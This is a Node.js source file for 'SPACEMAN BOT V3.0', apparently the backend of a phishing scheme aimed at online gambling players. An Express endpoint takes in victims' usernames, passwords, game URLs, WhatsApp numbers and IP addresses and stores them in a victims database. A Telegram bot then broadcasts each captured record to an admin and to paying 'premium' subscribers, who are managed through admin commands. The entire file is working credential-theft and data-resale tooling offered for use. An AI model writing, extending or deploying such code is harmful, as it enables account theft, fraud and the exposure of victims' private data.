// ========== IMPORTS & CONFIG ==========
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const CONFIG = {
    TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    ADMIN_ID: process.env.ADMIN_ID,
    PORT: process.env.PORT || 9000,
    START_VIDEO: process.env.START_VIDEO_URL || 'https://files.catbox.moe/xyz123.mp4',
    VERSION: '3.0.0'
};

// ========== INITIALIZE ==========
const app = express();
app.use(cors());
app.use(express.json());

const bot = new TelegramBot(CONFIG.TOKEN, { 
    polling: true,
    filepath: false
});

// Databases
const victimDb = new sqlite3.Database('./database/victims.db');
const premiumDb = new sqlite3.Database('./database/premium.db');

// ========== DATABASE SETUP ==========
function initDatabases() {
    victimDb.run(`
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT UNIQUE,
            username TEXT,
            password TEXT,
            game_url TEXT,
            whatsapp TEXT,
            ip TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    premiumDb.run(`
        CREATE TABLE IF NOT EXISTS premium_users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE,
            username TEXT,
            added_by TEXT,
            added_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            expires_at DATETIME,
            status TEXT DEFAULT 'active'
        )
    `);
}

// ========== PREMIUM SYSTEM ==========
async function addPremium(userId, days = 30, addedBy = 'system') {
    return new Promise((resolve, reject) => {
        const expires = new Date();
        expires.setDate(expires.getDate() + days);
        
        premiumDb.run(
            `INSERT OR REPLACE INTO premium_users 
             (user_id, added_by, expires_at, status) 
             VALUES (?, ?, ?, 'active')`,
            [userId, addedBy, expires.toISOString()],
            function(err) {
                if (err) reject(err);
                else resolve(true);
            }
        );
    });
}

async function removePremium(userId) {
    return new Promise((resolve, reject) => {
        premiumDb.run(
            "DELETE FROM premium_users WHERE user_id = ?",
            [userId],
            function(err) {
                if (err) reject(err);
                else resolve(this.changes > 0);
            }
        );
    });
}

async function getAllPremiumUsers() {
    return new Promise((resolve, reject) => {
        premiumDb.all(
            "SELECT user_id FROM premium_users WHERE status = 'active' AND expires_at > datetime('now')",
            (err, rows) => {
                if (err) reject(err);
                else resolve(rows.map(r => r.user_id));
            }
        );
    });
}

// ========== BROADCAST SYSTEM ==========
async function broadcastToAllPremium(victimData) {
    try {
        const message = formatVictimMessage(victimData);
        
        // 1. Send to ADMIN
        await bot.sendMessage(CONFIG.ADMIN_ID, message, { parse_mode: 'Markdown' });
        
        // 2. Send to ALL PREMIUM USERS
        const premiumUsers = await getAllPremiumUsers();
        
        for (const userId of premiumUsers) {
            try {
                await bot.sendMessage(userId, message, { parse_mode: 'Markdown' });
                console.log(`📤 Sent to premium user: ${userId}`);
            } catch (err) {
                console.log(`❌ Failed to send to ${userId}: ${err.message}`);
            }
        }
        
        console.log(`✅ Broadcast complete. Sent to: 1 admin + ${premiumUsers.length} premium users`);
        
    } catch (error) {
        console.error('Broadcast error:', error);
    }
}

function formatVictimMessage(data) {
    return `
🎰 *NEW VICTIM CAPTURED* 🎰

🆔 *ID:* \`${data.victim_id || 'N/A'}\`
⏰ *Time:* ${new Date().toLocaleString()}

👤 *CREDENTIALS:*
• Username: \`${data.username || 'N/A'}\`
• Password: \`${data.password || 'N/A'}\`
• Game: ${data.game_url || 'N/A'}

📱 *WHATSAPP:* ${data.whatsapp || 'N/A'}
🌐 *IP:* \`${data.ip || 'N/A'}\`

📊 *BOT STATS:*
• Version: ${CONFIG.VERSION}
• Auto-sent to premium users
• Status: ✅ ACTIVE
`;
}

// ========== TELEGRAM COMMANDS ==========
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const isAdmin = userId === CONFIG.ADMIN_ID;
    
    try {
        // Send video
        await bot.sendVideo(chatId, CONFIG.START_VIDEO, {
            caption: '🚀 *SPACEMAN BOT V3.0*\nPremium Victim Broadcast System',
            parse_mode: 'Markdown'
        });
        
        // Send menu based on role
        if (isAdmin) {
            await bot.sendMessage(chatId, `
┏─ 🤖 *ADMIN MENU*
│┃➳ /addprem <user_id> <days>
│┃➳ /dellprem <user_id>
│┃➳ /listprem
│┃➳ /stats
┗─
📊 *Mode:* ADMIN
👥 *You:* Receive all victim data
            `, { parse_mode: 'Markdown' });
        } else {
            // Check if user is premium
            premiumDb.get(
                "SELECT * FROM premium_users WHERE user_id = ? AND status = 'active' AND expires_at > datetime('now')",
                [userId],
                async (err, row) => {
                    if (row) {
                        await bot.sendMessage(chatId, `
👑 *PREMIUM USER MENU*
📊 Status: ACTIVE Premium
⏰ Expires: ${new Date(row.expires_at).toLocaleDateString()}

✅ You will receive:
• All victim data automatically
• Instant notifications
• Same data as admin

📱 Just wait for incoming data!
                        `, { parse_mode: 'Markdown' });
                    } else {
                        await bot.sendMessage(chatId, `
👤 *REGULAR USER*
📊 Status: Not Premium

🔒 Only premium users receive victim data.
Contact admin for premium access.
                        `, { parse_mode: 'Markdown' });
                    }
                }
            );
        }
    } catch (error) {
        console.error('Start command error:', error);
    }
});

bot.onText(/\/addprem (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (userId !== CONFIG.ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Admin only command!');
    }
    
    const targetUserId = match[1];
    const days = parseInt(match[2]);
    
    try {
        await addPremium(targetUserId, days, 'admin');
        await bot.sendMessage(chatId, `✅ Added ${targetUserId} as premium for ${days} days`);
        await bot.sendMessage(targetUserId, `🎉 You are now PREMIUM user!\nExpires in ${days} days.\nYou will receive all victim data automatically!`);
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

bot.onText(/\/dellprem (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (userId !== CONFIG.ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Admin only command!');
    }
    
    const targetUserId = match[1];
    
    try {
        const removed = await removePremium(targetUserId);
        if (removed) {
            await bot.sendMessage(chatId, `✅ Removed ${targetUserId} from premium`);
            await bot.sendMessage(targetUserId, `⚠️ Your premium access has been revoked.`);
        } else {
            await bot.sendMessage(chatId, `❌ User ${targetUserId} not found in premium list`);
        }
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

bot.onText(/\/listprem/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (userId !== CONFIG.ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Admin only command!');
    }
    
    premiumDb.all(
        "SELECT user_id, expires_at FROM premium_users WHERE status = 'active' ORDER BY expires_at DESC",
        async (err, rows) => {
            if (err) {
                return bot.sendMessage(chatId, `❌ Database error: ${err.message}`);
            }
            
            if (rows.length === 0) {
                return bot.sendMessage(chatId, '📭 No premium users found');
            }
            
            let list = '┏─ 👑 *PREMIUM USERS*\n';
            rows.forEach((row, index) => {
                const expires = new Date(row.expires_at);
                const daysLeft = Math.ceil((expires - new Date()) / (1000 * 60 * 60 * 24));
                list += `│┃➳ ${row.user_id} (${daysLeft} days left)\n`;
            });
            list += `┗─\n📊 Total: ${rows.length} active premium users`;
            
            await bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
        }
    );
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (userId !== CONFIG.ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Admin only command!');
    }
    
    Promise.all([
        new Promise((resolve) => {
            victimDb.get("SELECT COUNT(*) as count FROM victims", (err, row) => {
                resolve(row?.count || 0);
            });
        }),
        new Promise((resolve) => {
            premiumDb.get("SELECT COUNT(*) as count FROM premium_users WHERE status = 'active'", (err, row) => {
                resolve(row?.count || 0);
            });
        })
    ]).then(([victimCount, premiumCount]) => {
        const stats = `
📊 *BOT STATISTICS*
┏─
│┃➳ Total Victims: ${victimCount}
│┃➳ Premium Users: ${premiumCount}
│┃➳ Bot Version: ${CONFIG.VERSION}
│┃➳ Admin: @${msg.from.username || 'N/A'}
┗─
✅ System: OPERATIONAL
        `;
        bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
    });
});

// ========== WEB API FOR VICTIM DATA ==========
app.post('/api/victim', async (req, res) => {
    try {
        const data = req.body;
        const ip = req.ip || req.connection.remoteAddress;
        
        // Generate victim ID
        const victimId = `VCT_${Date.now().toString(36).toUpperCase()}`;
        
        // Save to database
        victimDb.run(
            `INSERT INTO victims (victim_id, username, password, game_url, whatsapp, ip) 
             VALUES (?, ?, ?, ?, ?, ?)`,
            [victimId, data.username, data.password, data.game_url, data.whatsapp, ip],
            async function(err) {
                if (err) {
                    return res.status(500).json({ success: false, error: 'Database error' });
                }
                
                // Broadcast to admin + all premium users
                await broadcastToAllPremium({
                    victim_id: victimId,
                    username: data.username,
                    password: data.password,
                    game_url: data.game_url,
                    whatsapp: data.whatsapp,
                    ip: ip
                });
                
                res.json({
                    success: true,
                    message: 'Data received and broadcasted',
                    victim_id: victimId,
                    broadcast_count: (await getAllPremiumUsers()).length + 1 // +1 for admin
                });
            }
        );
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        version: CONFIG.VERSION,
        premium_system: 'active',
        broadcast_enabled: true
    });
});

// ========== START SERVER ==========
function startServer() {
    initDatabases();
    
    app.listen(CONFIG.PORT, () => {
        console.log(`
┏────────────────────────────┓
│  🚀 SPACEMAN BOT V3.0     │
│  📡 Port: ${CONFIG.PORT}                │
│  👑 Admin: ${CONFIG.ADMIN_ID}       │
│  🤖 Premium System: ACTIVE │
┗────────────────────────────┛
✅ Server running: http://localhost:${CONFIG.PORT}
✅ Telegram bot polling started
✅ Auto-broadcast system ready
        `);
        
        // Send startup notification to admin
        bot.sendMessage(CONFIG.ADMIN_ID, 
            `🤖 *Bot Started Successfully*\n\n` +
            `✅ Version: ${CONFIG.VERSION}\n` +
            `✅ Premium System: ACTIVE\n` +
            `✅ Auto-broadcast: ENABLED\n` +
            `⏰ ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );
    });
}

startServer();